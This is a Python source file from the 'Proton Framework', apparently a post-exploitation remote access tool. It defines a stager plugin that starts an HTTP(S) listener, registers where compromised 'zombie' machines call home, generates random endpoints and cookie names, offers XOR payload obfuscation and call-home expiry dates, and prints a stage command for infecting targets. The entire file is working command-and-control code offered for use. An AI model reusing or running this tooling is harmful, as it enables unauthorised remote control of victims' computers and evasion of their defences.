#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.plugin
import core.server
import core.payload
import random
import string
import socket
import uuid

class StagerWizard(core.plugin.Plugin):
    WORKLOAD = 'NONE'

    def __init__(self, shell):
        self.port = 9999
        super(StagerWizard, self).__init__(shell)

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        hostname = '0.0.0.0'
        try:
            s.connect(('8.8.8.8', 80))
            hostname = s.getsockname()[0]
        except:
            pass
        finally:
            s.close()

        # general, non-hidden, non-advanced options
        self.options.register('SRVHOST', hostname, 'Where the stager should call home.', alias = 'LHOST')
        self.options.register('SRVPORT', self.port, 'The port to listen for stagers on.', alias = 'LPORT')
        self.options.register('EXPIRES', '', 'MM/DD/YYYY to stop calling home.', required = False)
        self.options.register('KEYPATH', '',  'Private key for TLS communications.', required = False, file = True)
        self.options.register('CERTPATH', '', 'Certificate for TLS communications.', required = False, file = True)
        self.options.register('ENDPOINT', self.random_string(5), 'URL path for callhome operations.', required = True)
        self.options.register('MODULE', '', 'Module to run once zombie is staged.', required = False)
        self.options.register('ONESHOT', 'false', 'Make this stager oneshot stager.', boolean = True, enum=['true', 'false'])
        self.options.register('AUTOFWD', 'true', 'Automatically fix forwarded URLs.', boolean=True, required=True, enum=['true', 'false'])

        # names of query string properties
        jobname = sessionname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
        while sessionname == jobname:
            sessionname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
        self.options.register('JOBNAME', jobname, 'Name for jobkey cookie.', advanced = True)
        self.options.register('SESSIONNAME', sessionname, 'Name for session cookie.', advanced = True)
        self.options.register('OBFUSCATE', 'xor', 'Obfuscate payloads with defined technique.', advanced = True, enum = ['', 'xor'])

        # query strings
        self.options.register('_JOBPATH_', '', 'The job path.', hidden = True)
        self.options.register('_SESSIONPATH_', '', 'The session path.', hidden = True)

        # script payload file paths
        self.options.register('_STDLIB_', self.stdlib, 'Path to stdlib file.', hidden = True)
        self.options.register('_STAGETEMPLATE_', self.stagetemplate, 'Path to stage template file.', hidden = True)
        self.options.register('_STAGE_', self.stage, 'Stage worker.', hidden = True)
        self.options.register('_STAGECMD_', self.stagecmd, 'Path to stage file.', hidden = True)
        self.options.register('_FORKCMD_', self.forkcmd, 'Path to fork file.', hidden = True)
        self.options.register('_FORKTEMPLATE_', self.forktemplate, 'Path to fork template file.', hidden = True)
        self.options.register('_WORKLOAD_', self.workload, 'Workload type.', hidden = True)

        # other things
        self.options.register("SESSIONKEY", "", "Unique key for a session.", hidden=True)
        self.options.register("JOBKEY", "", "Unique key for a job.", hidden=True)
        self.options.register("URL", "", "URL to the stager.", hidden=True)
        self.options.register('CLASSICMODE', '', ';)', hidden = True, enum=['true', 'false'])
        self.options.register('_EXPIREEPOCH_', '', 'Time to expire.', hidden = True)
        self.options.register('_MODULEOPTIONS_', '', 'Options for module on run.', hidden = True)
        self.options.register('ENDPOINTTYPE', '', 'Filetype to append to endpoint if needed.', hidden = True)
        self.options.register('FENDPOINT', '', 'Final endpoint.', hidden = True)

    def run(self):

        if self.options.get('ONESHOT') == 'true' and not self.options.get('MODULE'):
            self.shell.print_error('A ONESHOT Zombie needs a MODULE!')
            return
        
        if self.options.get('CLASSICMODE') == 'true':
            self.options.set('ENDPOINT', self.random_string(4000))

        srvport = int(str(self.options.get('SRVPORT')).strip())
        endpoint = self.options.get('ENDPOINT').strip()

        # if srvport in servers, then we already have a server running
        if srvport in self.shell.servers:
            if endpoint in self.shell.stagers[srvport]:
                self.shell.print_error("There is already a stager listening on that endpoint!")
            else:
                self.spawn_stager(srvport, endpoint);

        # if not, then we need to start a server
        else:
            keypath = self.options.get('KEYPATH').strip()
            certpath = self.options.get('CERTPATH').strip()
            if self.start_server(srvport, keypath, certpath):
                self.shell.stagers[srvport] = {}
                self.spawn_stager(srvport, endpoint);

    def spawn_stager(self, srvport, endpoint):
        import copy
        new_stager = Stager(self.shell, copy.deepcopy(self.options))
        self.shell.stagers[srvport][endpoint] = new_stager
        self.shell.play_sound('STAGER')
        self.shell.print_good(f"Spawned a stager at {new_stager.options.get('URL')}!")
        self.shell.print_command(new_stager.get_payload_data().decode())

    def start_server(self, port, keypath, certpath):
        try:
            server = core.server.Server(port, core.handler.Handler, keypath, certpath, self.shell, self.options)
            self.shell.servers[port] = server
            server.start()
            return True
        except OSError as e:
            port = str(self.options.get('SRVPORT'))
            if e.errno == 98:
                self.shell.print_error('Port %s is already bound!' % (port))
            elif e.errno == 13:
                self.shell.print_error('Port %s bind permission denied!' % (port))
            else:
                raise
            return False
        except Exception as ex:
            import traceback
            template = 'An exception of type {0} occured. Arguments:\n{1!r}'
            message = template.format(type(ex).__name__, ex.args)
            self.shell.print_error(message)
            traceback.print_exc()
            return False
        except:
            self.shell.print_error('Failed to spawn stager!')
            raise
            return False

class Stager():
    def __init__(self, shell, options):
        self.shell = shell
        self.options = options
        self.killed = False
        self.module = self.shell.state

        if self.options.get('EXPIRES'):
            from datetime import datetime
            import time
            dtime = datetime.strptime(self.options.get('EXPIRES'), '%m/%d/%Y')
            etime = int(round((dtime - datetime.utcfromtimestamp(0)).total_seconds()*1000))
            if etime < int(round(time.time() * 1000)):
                self.shell.print_error('Expiration date cannot be today or in the past!')
                return False
            self.options.set('_EXPIREEPOCH_', etime)
        else:
            self.options.set('_EXPIREEPOCH_', str(random.randint(100000000000000,999999999999999)))

        keyt = self.options.get('KEYPATH')
        cert = self.options.get('CERTPATH')

        self.is_https = False
        if cert and keyt:
            self.is_https = True

        self.options.set('SRVHOST', self.options.get('SRVHOST').strip())
        self.options.set('SRVPORT', int(str(self.options.get('SRVPORT')).strip()))
        self.options.set('ENDPOINT', self.options.get('ENDPOINT').strip())
        self.options.set('FENDPOINT', self.options.get('ENDPOINT')+self.options.get('ENDPOINTTYPE'))
        self.options.set('_FORKCMD_', self.options.get('_FORKCMD_').decode().replace('\\','\\\\').replace('\"', '\\\"').encode())

        self.options.set('URL', self._build_url())

        if self.options.get('MODULE'):
            import copy
            module = self.options.get("MODULE")
            if '/' not in module:
                module = [k for k in self.shell.plugins if k.lower().split('/')[-1] == module.lower()][0]
                self.options.set("MODULE", module)
            plugin = self.shell.plugins[module]
            options = copy.deepcopy(plugin.options)
            self.options.set('_MODULEOPTIONS_', options)

        stage_cmd = self.options.get("_STAGECMD_")
        payload_cmd = core.loader.apply_options(stage_cmd, self.options)
        self.payload = core.payload.Payload(payload_cmd)

        self.WORKLOAD = self.options.get('_WORKLOAD_')
        self.endpoint = self.options.get('ENDPOINT')

    def _build_url(self):
        hostname = self.options.get("SRVHOST")
        if hostname == '0.0.0.0':
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 80))
                hostname = s.getsockname()[0]
            finally:
                s.close()

        self.hostname = hostname
        self.port = str(self.options.get("SRVPORT"))

        prefix = "https" if self.is_https else "http"
        url = prefix + "://" + self.hostname + ':' + self.port

        endpoint = self.options.get("FENDPOINT").strip()
        url += "/" + endpoint

        return url

    def get_payload_data(self):
        return self.payload.data

    def get_payload_id(self):
        return self.payload.id
